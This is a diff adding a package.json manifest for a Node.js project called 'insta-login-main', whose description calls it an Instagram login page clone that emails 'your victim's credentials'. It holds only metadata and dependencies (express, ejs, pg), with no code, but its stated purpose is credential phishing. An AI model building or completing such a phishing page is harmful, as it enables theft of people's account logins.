@@ -1,0 +1,17 @@
+{
+  "name": "insta-login-main",
+  "version": "1.0.0",
+  "description": "Instagram login page clone which send your victim's credentials through email.</br> The webpage works on both **mobile** web browsers & **desktop**.<br/>",
+  "main": "index.js",
+  "type": "module",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "ejs": "^3.1.9",
+    "express": "^4.19.1",
+    "pg": "^8.11.3"
+  }
+}
